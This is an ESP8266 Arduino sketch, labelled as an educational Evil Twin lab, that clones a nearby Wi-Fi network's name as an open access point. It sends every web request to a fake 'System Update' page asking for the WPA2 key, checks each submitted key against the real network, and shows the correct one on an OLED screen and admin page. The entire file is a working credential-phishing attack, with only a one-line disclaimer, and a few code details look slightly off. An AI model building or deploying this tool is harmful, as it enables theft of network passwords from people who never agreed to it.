/*
 * Project: ESP8266 Captive Portal Lab
 * Description: Educational tool for demonstrating captive portal/Evil Twin mechanics.
 * WARNING: For educational/authorized research use only.
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// --- Configuration ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

ESP8266WebServer server(80);
DNSServer dnsServer;

String scanResults = "";
String currentClonedSSID = "None";
String capturedPassword = "";
String lastAttemptedPass = "";
unsigned long startConnectTime = 0;
bool isVerifying = false;

const byte DNS_PORT = 53;
const char* ADMIN_SSID = "Security_Lab_Node";
const char* ADMIN_PASS = "password123";

// --- UI Styling ---
String getStyles() {
  return "<style>body{font-family:sans-serif;background:#121212;color:#e0e0e0;text-align:center;padding:20px;}"
         ".card{max-width:400px;margin:auto;background:#1e1e1e;padding:30px;border-radius:15px;border:1px solid #333;}"
         "h1{color:#ff5252;} input{width:100%;padding:12px;margin:10px 0;border-radius:5px;border:1px solid #444;background:#2c2c2c;color:white;font-size:16px;}"
         ".btn{width:100%;padding:12px;background:#388e3c;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;}"
         ".admin-box{border:1px solid #00e676; padding:15px; margin-top:20px; text-align:left; color:#00e676; font-family:monospace;}</style>";
}

// --- Handlers ---
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>" + getStyles() + "</head><body>";

  if (currentClonedSSID == "None") {
    html += "<div class='card'><h2>SYSTEM CONSOLE</h2>";
    if (capturedPassword != "") {
      html += "<div class='admin-box'><b>[DATA CAPTURED]</b><br>SSID: " + currentClonedSSID + "<br>PASS: " + capturedPassword + "</div>";
    }
    html += "<form action='/clone' method='POST'><select name='ssid'>" + scanResults + "</select>";
    html += "<input type='submit' class='btn' value='START SIMULATION'></form></div>";
  } else {
    html += "<div class='card'><h1>⚠️ System Update</h1>";
    html += "<p>Authentication expired for <b>" + currentClonedSSID + "</b>. Enter WPA2 key to resume session.</p>";
    html += "<form action='/validate' method='POST'>";
    html += "<input type='password' name='pass' placeholder='Password' required>";
    html += "<input type='submit' class='btn' value='Update & Reconnect'></form></div>";
  }
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleClone() {
  currentClonedSSID = server.arg("ssid");
  WiFi.softAP(currentClonedSSID.c_str()); 
  updateDisplay("CLONE ACTIVE", currentClonedSSID);
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void handleValidate() {
  lastAttemptedPass = server.arg("pass");
  
  WiFi.begin(currentClonedSSID.c_str(), lastAttemptedPass.c_str());
  isVerifying = true;
  startConnectTime = millis();
  
  updateDisplay("VERIFYING...", currentClonedSSID);
  
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void updateDisplay(String l1, String l2) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 10); display.println(l1);
  display.setCursor(0, 30); display.println(l2);
  display.display();
}

void setup() {
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA);
  
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) scanResults += "<option value='" + WiFi.SSID(i) + "'>" + WiFi.SSID(i) + "</option>";

  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  dnsServer.start(DNS_PORT, "*", WiFi.softIP());
  
  server.on("/", handleRoot);
  server.on("/clone", HTTP_POST, handleClone);
  server.on("/validate", HTTP_POST, handleValidate);
  server.onNotFound([]() { server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); });
  
  server.begin();
  updateDisplay("LAB READY", "Admin Mode");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (isVerifying) {
    if (WiFi.status() == WL_CONNECTED) {
      capturedPassword = lastAttemptedPass;
      isVerifying = false;
      WiFi.disconnect();
      WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
      currentClonedSSID = "None"; 
      updateDisplay("PASS CAPTURED!", capturedPassword);
    } 
    else if (millis() - startConnectTime > 10000) {
      isVerifying = false;
      WiFi.disconnect();
      WiFi.softAP(currentClonedSSID.c_str());
      updateDisplay("INVALID PASS", "Retrying...");
    }
  }
}